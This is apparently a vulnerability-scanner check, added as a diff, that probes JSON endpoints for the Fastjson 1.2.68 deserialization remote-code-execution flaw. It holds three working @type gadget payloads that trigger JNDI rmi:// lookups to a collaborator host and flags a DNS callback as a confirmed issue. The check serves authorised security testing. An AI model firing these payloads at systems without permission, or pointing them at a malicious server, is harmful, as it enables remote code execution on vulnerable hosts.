@@ -1,0 +1,26 @@
+metadata:
+  language: v1-beta
+  name: "Fastjson 1.2.68 Deserialization RCE"
+  description: "https://paper.seebug.org/1192/"
+  author: "Javeley"
+  tags: "Fastjson", "Deserialization","RCE","Alibaba"
+
+run for each:
+    payload = 
+      `\{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"rmi://{generate_collaborator_address()}/{random_str(4)}"}`,
+      `\{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"rmi://{generate_collaborator_address()}/{random_str(4)}"}`,
+      `\{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"rmi://{generate_collaborator_address()}/{random_str(4)}"}`
+
+given request then
+  if {base.request.body} matches "^[{]" and "application/json" in {base.request.headers} then
+      send request:
+          body: {payload}
+
+      if dns interactions then
+          report issue:
+              severity: high
+              confidence: certain
+              detail: "https://paper.seebug.org/1192/."
+              remediation: "https://paper.seebug.org/1192/."
+      end if 
+  end if
